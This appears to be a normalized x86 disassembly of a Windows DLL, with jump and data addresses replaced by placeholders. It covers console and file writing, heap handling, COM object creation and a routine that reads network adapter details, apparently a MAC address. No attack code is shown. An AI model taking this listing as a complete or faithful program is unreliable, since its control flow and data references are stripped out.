mov edx [ eax + 0x18 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x6
call edx
jmp r-xdata
cmp esi [ rw-data ]
jne r-xdata
add esi 0x24
cmp esi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_100251a8
add esp 0x8
test eax eax
je r-xdata
cmp eax 0xc
jne r-xdata
xor edx edx
cmp [ rw-data ] edx
sete dl
mov [ rw-data ] edx
jmp r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_10007340
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax ]
call sub_10027ab0
test eax eax
lea edi [ ebp - 0x68 ]
sete bl
call sub_10014890
test bl bl
je r-xdata
push 0x1
call sub_1005e900
mov eax edi
mov eax [ edi ]
jmp r-xdata
lea ecx [ esi + 0x20 ]
add esi 0x1c
push esi
mov edx ebx
call sub_1005aa10
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x19
call sub_1001bb80
lea edx [ ebp - 0x44 ]
mov eax 0x7f
call sub_1001bb80
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_1001c7c0
mov esi eax
test esi esi
je r-xdata
cmp edi [ rw-data ]
je r-xdata
add edi 0x24
cmp edi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_100251a8
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x4
je r-xdata
push 0x1
call sub_10048150
jmp r-xdata
mov ecx [ ebx ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_1001c7c0
mov esi eax
test esi esi
je r-xdata
push esi
call sub_1004c7aa
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10024280
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
lea ecx [ edi + 0x20 ]
push ecx
lea ecx [ edi + 0x1c ]
call sub_10048260
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x5
jne r-xdata
add esp 0x4
mov eax [ rw-data ]
fld [ eax + 0x118 ]
sub esp 0x8
fstp [ esp + 0x4 ]
fld [ eax + 0x114 ]
fstp [ esp ]
call sub_10001150
add esp 0x8
jmp r-xdata
push esi
call sub_1004c7aa
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10041fb0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
call sub_10028c10
sub_100066c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e093
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ ebp + 0x8 ]
xor edx edx
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
mov eax [ edi + 0x18 ]
mov [ ebp - 0x4 ] edx
cmp eax edx
jne r-xdata
lea ecx [ esi + 0x18 ]
push eax
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_1005daf0
push edi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_100483be
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea eax [ edi + 0x1c ]
sub_10006750
push ebp
mov ebp esp
push ecx
cmp [ edi ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ LocalFree@IAT ]
push esi
mov edx [ edi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
pop ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push eax
call ebx
sub_100067d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_1001bf74
pop ecx
sub_100067f9
push 0x10
mov eax sub_1007e5e8
call sub_10050d0f
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10018685
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_1002a730
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1001a1b3
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_1005e05a
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_1000692f
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_100794a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_1003c242
mov [ eax ] edi
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
jmp r-xdata
push esi
call sub_1005c70c
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_1005905c
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_10044fed
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_10012991
mov [ eax ] 0x1c
call sub_1003c242
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_100249b4
pop ecx
jmp r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10035cd0
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_10053917
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_100543a1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_100543a1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_10053917
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1000702c
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100090c1
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1002b004
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_10005e18
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
sub_100070c0
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xa0 ]
lea edx [ ebp - 0xa4 ]
mov esi ecx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa0 ] ebx
call sub_100263e0
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x112
mov [ ebp - 0x9c ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0x9c ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
lea eax [ ebx + 0x79 ]
call sub_1000a6f0
mov ebx 0x1
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xa1
call sub_1000a6f0
mov edx [ ebp - 0xa4 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xa0 ]
push eax
call esi
mov ecx [ ebp - 0x9c ]
push ecx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax [ ebp - 0x9c ]
push eax
call sub_1000eb90
mov edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xa4 ]
add esp 0x4
push eax
call sub_1000ea00
jmp r-xdata
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] eax
sub_100071d0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x38 ] dx
lea edx [ ebp - 0x10 ]
mov eax 0x92
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x30 ] 0x1
call sub_1000a6f0
mov ebx [ ebp - 0x38 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x34 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x30 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x2c ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
push edx
mov edx [ ebp - 0x20 ]
mov ecx edi
xor ebx ebx
call sub_1000a880
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ ebp - 0x14 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov ebx 0x3
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
je r-xdata
lea ebx [ edi + 0x6 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x1c ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x18 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
push eax
call sub_10049460
mov ecx [ ebp - 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov ebx 0x4
jmp r-xdata
sub_10007340
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x9b
sub eax 0x2
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov [ esi ] eax
mov eax [ ecx + 0x24 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x70
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call sub_1000a6f0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_100073c0
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ GetAdaptersInfo@IAT ]
push edi
mov edi ecx
lea ecx [ ebp - 0x4c ]
push ecx
push 0x0
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] 0x0
call ebx
cmp eax 0x6f
je r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ edi ]
push esi
push edx
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x4c ]
push ecx
push esi
call ebx
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0xc ]
mov eax 0x19
mov ebx esi
call sub_100211a0
mov edi [ lstrcmpA@IAT ]
mov edi edi
mov edx [ edi ]
push esi
push 0x0
push edx
call [ HeapFree@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x48 ]
mov eax 0x9
call sub_10036cd0
movzx edx [ ebx + 0x199 ]
movzx eax [ ebx + 0x198 ]
movzx ecx [ ebx + 0x197 ]
push edx
movzx edx [ ebx + 0x196 ]
push eax
movzx eax [ ebx + 0x195 ]
push ecx
movzx ecx [ ebx + 0x194 ]
mov ebx [ ebp - 0x54 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx 0x12
call sub_100254a0
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
add esp 0x1c
push esi
push 0x0
push ecx
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebx + 0x1d8 ]
push ecx
call edi
test eax eax
je r-xdata
sub_10007530
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
lea edx [ esi + 0x10 ]
push edx
call sub_1002fd00
mov eax [ esi ]
add esp 0xc
push eax
call [ SetEvent@IAT ]
xor eax eax
pop esi
pop ebp
retn 0x4
sub_10007560
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100270f0
mov [ esi + 0x4 ] 0x1
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
